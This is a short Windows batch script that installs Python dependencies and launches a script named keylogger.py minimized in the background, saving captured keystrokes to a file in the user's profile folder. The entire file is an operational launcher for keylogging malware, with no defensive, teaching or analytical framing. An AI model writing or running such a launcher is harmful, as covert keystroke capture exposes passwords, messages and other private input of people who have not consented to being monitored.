@echo off
pip install -r requirements.txt
echo Starting keylogger in background...
start /min python keylogger.py
echo Logs will be saved to %USERPROFILE%\keylog.txt
